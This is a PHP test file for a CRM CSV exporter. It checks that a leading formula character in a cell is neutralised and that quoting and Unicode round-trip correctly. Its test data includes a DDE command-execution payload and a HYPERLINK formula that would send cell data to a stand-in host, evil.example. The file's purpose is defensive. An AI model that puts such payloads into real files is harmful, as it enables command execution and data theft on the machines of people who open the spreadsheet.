<?php

declare(strict_types=1);

use App\Support\CrmExportCsvWriter as Csv;

/**
 * CSV formula injection. The threat is not this application: it is the spreadsheet the
 * operator opens the file in, which evaluates a leading `=`, `+`, `-` or `@` as code.
 */
it('neutralises every formula-triggering prefix', function (string $payload) {
    $neutralised = Csv::neutralise($payload);

    expect($neutralised)->toStartWith("'")
        // The original content is preserved verbatim after the apostrophe: neutralising
        // must not corrupt the data, only stop it being executed.
        ->and($neutralised)->toBe("'".$payload)
        ->and(substr($neutralised, 1))->toBe($payload);
})->with([
    'equals formula' => '=1+1',
    'sum formula' => '+SUM(A1:A9)',
    'minus formula' => '-2+3',
    'at command' => '@SUM(1)',
    'DDE payload' => '=cmd|\' /C calc\'!A0',
    'hyperlink exfiltration' => '=HYPERLINK("https://evil.example/"&A1,"click")',
    'leading tab' => "\tpayload",
    'leading carriage return' => "\rpayload",
    'leading line feed' => "\npayload",
    'plus addressed e-mail' => '+contact@example.com',
    'negative number as text' => '-1000',
]);

it('leaves a safe value untouched', function (string $value) {
    expect(Csv::neutralise($value))->toBe($value);
})->with([
    'plain address' => 'contact@example.com',
    'name' => 'Amina Diallo',
    'uuid' => '3f2504e0-4f89-11d3-9a0c-0305e82c3301',
    'digits' => '1234567890',
    // Only the FIRST character decides: a mid-string '=' is literal text and must not
    // be mangled, or every legitimate value containing '=' would be corrupted.
    'mid-string equals' => 'a=b',
    'mid-string plus' => 'a+b',
    'status' => 'anonymized',
]);

it('writes an empty field for a null and never invents a placeholder', function () {
    // An anonymized contact has NO address. Writing "NULL", "-" or "n/a" would invent a
    // value that a reader could mistake for data.
    expect(Csv::neutralise(null))->toBe('')
        ->and(Csv::neutralise(''))->toBe('');
});

it('passes integers through without quoting or neutralisation', function () {
    expect(Csv::neutralise(0))->toBe('0')
        ->and(Csv::neutralise(42))->toBe('42')
        // A negative integer is a number, not a formula: it arrives as an int from the
        // authority and cannot carry a payload.
        ->and(Csv::neutralise(-7))->toBe('-7');
});

it('escapes commas, quotes, newlines and preserves Unicode when writing a row', function () {
    $handle = fopen('php://temp', 'w+b');

    Csv::writeRow($handle, ['plain', 'has,comma', 'has"quote', "has\nnewline", 'héllo — wörld ✓']);
    rewind($handle);
    $csv = stream_get_contents($handle);
    fclose($handle);

    expect($csv)->toContain('"has,comma"')
        ->and($csv)->toContain('"has""quote"')
        ->and($csv)->toContain('héllo — wörld ✓')
        // RFC 4180 line endings so the file opens identically on Windows and Unix.
        ->and($csv)->toEndWith("\r\n");

    // Round-trips through a real parser back to the original values.
    $parsed = str_getcsv(explode("\r\n", $csv)[0], ',', '"', '\\');
    expect($parsed[1])->toBe('has,comma')
        ->and($parsed[2])->toBe('has"quote')
        ->and($parsed[4])->toBe('héllo — wörld ✓');
});

it('neutralises a dangerous cell even when it also needs quoting', function () {
    $handle = fopen('php://temp', 'w+b');

    Csv::writeRow($handle, ['=1+1,evil', '=a"b']);
    rewind($handle);
    $csv = stream_get_contents($handle);
    fclose($handle);

    // Quoting alone is NOT a defence: an importer strips the quotes and the cell is a
    // formula again. Both cells must carry the apostrophe as well.
    expect($csv)->toContain('"\'=1+1,evil"')
        ->and($csv)->toContain('\'=a');

    $parsed = str_getcsv(explode("\r\n", $csv)[0], ',', '"', '\\');
    expect($parsed[0])->toStartWith("'")
        ->and($parsed[1])->toStartWith("'");
});

it('declares a fixed column set per kind and refuses an unknown kind', function () {
    expect(Csv::header('crm_contacts'))
        ->toBe(['contact_id', 'public_id', 'email', 'status', 'origin', 'created_at'])
        ->and(Csv::header('segment_current_members'))->toBe(Csv::header('crm_contacts'))
        // A new database column can never appear in an export by accident.
        ->and(fn () => Csv::header('xlsx_dump'))->toThrow(InvalidArgumentException::class);
});

it('lists exactly the prefixes a spreadsheet treats as an expression', function () {
    expect(Csv::DANGEROUS_PREFIXES)->toBe(['=', '+', '-', '@', "\t", "\r", "\n"]);
});
